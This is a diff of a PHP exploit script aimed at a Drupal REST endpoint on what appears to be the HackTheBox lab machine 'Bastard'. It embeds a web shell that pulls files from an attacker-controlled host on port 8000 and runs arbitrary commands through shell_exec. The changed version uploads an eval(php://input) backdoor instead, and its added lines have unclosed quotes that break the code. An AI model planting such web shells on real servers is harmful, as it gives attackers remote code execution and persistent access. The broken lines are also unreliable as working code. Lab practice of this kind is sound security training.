@@ -28,26 +28,28 @@ define('TYPE_JSON', 'application/json');
 define('CONTROLLER', 'user');
 define('ACTION', 'login');
 
-$url = 'http://bastard.htb/';
-$endpoint_path = '/rest_endpoint';
+$url = '10.10.10.9';
+$endpoint_path = '/rest';
 $endpoint = 'rest_endpoint';
+
 
 $phpCode = <<<'EOD'
 <?php
- if (isset($_REQUEST['fupload'])) {
-	file_put_contents($_REQUEST['fupload'], file_get_contents("http://bastard.htb:8000/" . $_REQUEST['fupload']));
+	if (isset($_REQUEST['fupload])) {
+	file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.16.40:8000/" . $_REQUEST['fupload']));
 };
 if (isset($_REQUEST['fexec'])) {
-	echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
-	};
+echo "<pre>" . shell_exec($_REQUEST['fexec] . "</pre>";
+};
 ?>
 EOD;
+
+
+
 $file = [
-    'filename' => 'xsisec.php',
-    'data' => $phpCode
+    'filename' => 'dixuSOspsOUU.php',
+    'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'
 ];
-
-
 
 $browser = new Browser($url . $endpoint_path);
 
